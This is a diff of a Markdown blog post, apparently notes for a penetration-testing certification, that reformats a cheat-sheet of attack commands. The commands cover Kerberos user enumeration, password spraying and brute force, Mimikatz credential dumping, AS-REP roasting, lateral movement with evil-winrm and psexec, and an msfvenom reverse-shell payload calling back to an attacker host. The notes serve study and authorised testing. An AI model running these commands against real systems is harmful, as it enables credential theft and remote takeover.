@@ -88,59 +88,32 @@ This mind map will help you visualize the various phases and tools necessary to 
 https://orange-cyberdefense.github.io/ocd-mindmaps/
 {{</callout>}}
 
-## Table of useful command
-| --- | --- | --- |
-| **`kerbrute`** | Enumerate brute force/password spray | `Enumeration`: *kerbrute userenum -d example.local --dc 192.168.1.10 users.txt* 
-<br>`BruteForce`: *kerbrute bruteuser -d example.local --dc 192.168.1.10 administrator passwords.txt* 
-<br>*users.txt* file with user list |
+### Table of useful command
+| **Tool**          | **Uso / Descrizione**                                   | **Comandi Principali / Note**                                                                                                    |
+|-------------------|--------------------------------------------------------|----------------------------------------------------------------------------------------------------------------------------------|
+| `kerbrute`        | Enumerate / brute force / password spray                | **Enumeration:**<br>_kerbrute userenum -d example.local --dc 192.168.1.10 users.txt_<br>**BruteForce:**<br>_kerbrute bruteuser -d example.local --dc 192.168.1.10 administrator passwords.txt_<br>**User list file:**<br>_users.txt_ |
+| `crackmapexec`    | Enum hosts<br>Enum null session<br>Enum anonymous access| **Get password Policy:**<br>_cme <IP> -u ‘user’ -p ‘password’ --pass-pol_<br>**Username but NO pwd:**<br>_cme smb <dc_ip> -u user.txt -p password.txt --no-bruteforce_<br>**Valid Credential:**<br>_cme smb <IP> -u <user> -p '<password_from_before>' --users_<br>_cme smb <IP> -u <user> -p '<password_from_before>' --shares_<br>**Enumeration:**<br>_crackmapexec smb <IP>_<br>_crackmapexec smb <IP> -u 'a' -p ''_<br>**Lateral Movement:**<br>_crackmapexec smb <IP> -u <user> -p <password> -d <domain>_ |
+| `evil-winrm`      | Access to target machine                               | **Lateral Movement:**<br>_evil-winrm -i 192.168.1.100 -u Administrator -p 'Password123'_                                         |
+| `xfreerdp`        | Access to target machine                               | **Lateral Movement:**<br>_xfreerdp /v:192.168.1.100 /u:Administrator /p:'Password123'_                                            |
+| `smbclient`       | Accedere a risorse SMB/CIFS                            | **Lateral Movement:**<br>_smbclient.py <domain>/<user>:<Password123>@<IP>_<br>_smbclient -L //<dc_ip/_                           |
+| `Enter-PSSession` | Start interactive session                              | _Enter-PSSession <domain>_<br>_Enter-PSSession seclogs.resesarch.security.local_                                                 |
+| `net`             | Useful for policy settings                             | _net accounts_<br>_net user administrator_                                                                                        |
+| `runas`           | Access to victim                                       | _runas.exe /user:administrator cmd_                                                                                              |
+| `PowerView`       | Enumeration AD - Powersploit suite                     | **AS-REP Roasting primary step:**<br>_Get-DomainUser | Where-Object { $_.UserAccountControl -like "\*DONT_REQ_PREAUTH\*" }_<br>**AD-Kerberoasting:**<br>_Get-NetUser | Where-Object {$_.servicePrincipalName} | fl_<br>_setspn -T research -Q /_<br>**Command:**                                          |
+| `winpeas`         | Identify misconfigurations, permissions, and vulnerabilities | **Privilege escalation:**<br>_winpeas.exe_                                                                              |
+| `msfvenom`        | Used to generate a reverse_tcp payload                 | _msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.5.101 LPORT=4444 -f exe > rTCP.exe_                                   |
+| `msfconsole`      | Metasploit module                                      | _msfconsole -q_<br>**Meterpreter session:**<br>_exploit/windows/misc/hta_server_                                                 |
+| `Mimikatz`        | https://www.hackingarticles.in/metasploit-for-pentester-mimikatz/ | **hashdump:**<br>_hashdump_<br>Return NTLM Hash of the user<br>**creds_all:**<br>_creds:all_<br>Extract all possible hashes or credentials<br>**lsa_dump_secrets:**<br>_lsa_dump_secrets_<br>Extract credential stored into Local Security Authority<br>**lsa_dump_sam:**<br>_lsa_dump_sam_<br>Extract Security Account Manager and dumps credentials for local accounts |
+| `psexec`          | Execute command on target machine                      | _psexec \\\\<target_ip> <cmd_command>_<br>OR<br>Use for PTH                                                                    |
+| `wmiexec`         | Used to run command on target machine                  | _python wmiexec.py username:password@target_ip "whoami"_                                                                        |
+| `fping`           | Ping ICMP machines to get alive                        | _fping -a -g 192.168.1.0/24_                                                                                                    |
+| `GetNPUsers`      | Used to find hash                                      | _python GetNPUsers.py <domain>/ -userfile <username.txt> -format hashcat -outputfile <hash_out.txt>_<br>_rebeus.exe asreproast /format:hashcat_ |
+| `hashcat`         | Used to crack hash                                     | _hashcat -m <algorithm> -a <type_of_attack> hash.txt_                                                                           |
+| `hydra`           | Brute force                                            | _hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 10.0.0.89 smb2_ |
+| `wpscan`          | Wordpress vuln                                         |                                                                                                                                |
+| `nmap`            | Port scanning                                          | _nmap -sC -sV -Pn -p- -oA output.txt <IP_addr> -vv_                                                                             |
 
-| **`crackmapexec`** | Enum hosts <br>Enum null sess <br>Enum anony access | `Get password Policy`: *cme <IP> -u ‘user’ -p ‘password” --pass-pol* <br>**DO IT BEFORE… THEN TUNE THE Pwd SPARY with policy obtained** <br>`Username but NO pwd:` *cme smb <dc_ip> -u user.txt - password.txt --no-bruteforce* <br>`Valid Credential:`<br> 
-**Users**: *cme smb <IP> -u <user> -p ‘<password_from_before>’ --users*<br>
-**Account**: *cme smb <IP> -u <user> -p ‘<password_from_before>’ --shares* 
-<br>`Enumeration`: *crackmapexec smb <IP>*
-<br>`Enumeration`: *crackmapexec smb <IP> -u “ p”* `Enumeration`: *crackmapexec smb <IP> -u ‘a’ -p”*
-<br>`Lateral Movement`: *crackmapexec smb <IP> -u <user> -p <password> -d <domain>* |
-
-| **`evil-winrm`** | Access to target machine | `Lateral Movement`: *evil-winrm -i 192.168.1.100 -u Administrator -p 'Password123'* |
-| **`xfreerdp`** | Access to target machine | `Lateral Movement`: *xfreerdp /v:192.168.1.100 /u:Administrator /p:'Password123'* |
-| **`smbclient`** | access to SMB/CIFS resource | `Lateral Movement`: [smbclient.py](http://smbclient.py) <domain>/<user>:<Password123>@<IP>
-<br> *smbclient -L //<dc_ip>/* |
-| **`Enter-PSSession`** | Start interactive session | *Enter-PSSession <domain> <br> Enter-PSSession seclogs.resesarch.security.local* |
-| **`net`** | Useful for policy settings | *net accounts net user administrator* |
-| **`runas`** | Access to victim | *runas.exe /user:administrator cmd* [runas.exe /user:administrator cmd](https://www.notion.so/runas-exe-user-administrator-cmd-1196583d22bc80a1a689d2576e37705d?pvs=21)  |
-| **`PowerView`** | Enumeration AD - Powersploit suite | `AS-REP Roasting primary step`: <br>*Get-DomainUser | Where-Object { $_.UserAccountControl -like "*DONT_REQ_PREAUTH*" }*
-**[**Command:**](https://www.notion.so/Command-10c6583d22bc8002a34fe43b85bac6d6?pvs=21)** 
-<br>`AD-Kerberoasting`: *Get-NetUser | Where-Object {$_.servicePrincipalName} | fl setspn -T research -Q */** **[**Command:**](https://www.notion.so/Command-10c6583d22bc80c694fdc162e0fccd8f?pvs=21)**  |
-| **`winpeas`** | Identify misconfigurations, permissions, and vulnerabilities that could be exploited to gain elevated privileges | `Privilefge esclation:` *winpeas.exe* |
-| **`msfvenom`** | Used to generate a reverse_tcp payload | *msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.5.101 LPORT=4444 -f exe > rTCP.exe
-[**Command:**](https://www.notion.so/Command-f9a04aef68a348318f1741f6ac6dce2f?pvs=21)*  |
-| **`msfconsole`** | Metasploit module | *msfconsole -q*
-Meterpreter session: *exploit/windows/misc/hta_server* |
-| **`Mimikatz`** | https://www.hackingarticles.in/metasploit-for-pentester-mimikatz/ | **`hashdump`: *hashdump**
-Return NTLM Hash of the user*
-**`creds_all`: *creds:all**
-Extract all possible hashes or credentials form Security Packages*
-**`lsa_dump_secrets`:** ***lsa_dump_secrets**
-Extract credential stored into Local Security Authority*
-**`lsa_dump_sam`: *lsa_dump_sam**
-Extract Security Account Manager and dumps credentials for local accounts* |
-| **`psexec`** | Execute command on target machine | *psexec \\\\<target_ip> <cmd_command>*
-OR
-use for PTH |
-| **`wmiexec`** | Used to run command on target machine | *python [wmiexec.py](http://wmiexec.py/) username:password@target_ip "whoami"*
- |
-| **`fping`** | Ping ICMP machine to get alive | *fping -a -g 192.168.1.0/24* |
-| **`GetNPUsers`** | Used to find hash | *python [GetNPUsers.py](http://GetNPUsers.py) <domain>/ -userfile <username.txt> -format hashcat -outputfile <hash_out.txt>
-
-rebeus.exe asreproast /format:hashcat* |
-| **`hashcat`** | Used to crack hash | *hashcat -m <algorithm> -a <type_of_attack> hash.txt*  |
-| **`hydra`** | Brute force  | *hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 10.0.0.89 smb2*
- |
-| **`wpscan`** | Wordpress vuln | [## detect plugins vulnerable
-wpscan --url https://kihvhc2nhb0uocklpg88obt.eu-central-1.attackdefensecloudlabs.com/ --enumerate p --plugins-detection aggressive](https://www.notion.so/detect-plugins-vulnerable-wpscan-url-https-kihvhc2nhb0uocklpg88obt-eu-central-1-attackdefenseclo-df7a015647dc4ee3a18cbb6ec2a6fcf3?pvs=21)  |
-| **`nmap`** | port scanning | *nmap -sC -sV -Pn -p- -oA output.txt <IP_addr> -vv* |
-
-![eCPPT_DANDREA](eCPPT_DANDREA.png)
+![eCPPTv3_DANDREA](eCPPT_DANDREA.png)
 
 ### Conclusion
 
